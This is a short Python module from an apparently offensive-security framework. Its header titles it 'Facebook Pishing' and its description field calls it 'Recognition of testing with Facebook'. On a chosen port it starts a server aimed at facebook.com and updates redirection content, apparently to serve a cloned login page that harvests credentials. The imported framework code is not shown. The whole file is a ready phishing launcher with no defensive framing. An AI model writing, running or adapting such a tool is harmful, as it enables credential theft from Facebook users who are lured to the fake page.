#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
###########################################
from core.framework import sack           #
from core.generals import generals        #
from core.server import componentBase     #
###########################################


# Module global configs
doAuthor = "Jose Pino, @jofpin"
doVersion = "1.0"
doDate = "30-08-2016"
doDescription = "Recognition of testing with Facebook"


Framework = sack()


def boot(option):
    try:
        port = int(option[2])
    except IndexError:
        # Use options
        Framework.usageOpt("fbp <port>")
        return
    # Header design module
    Framework.headerModule("Facebook Pishing", doVersion, doAuthor, "2016")
    # Target
    Server = componentBase("https://facebook.com", port)
    # Update the file redirection
    Server.updateContent()
    Server.run()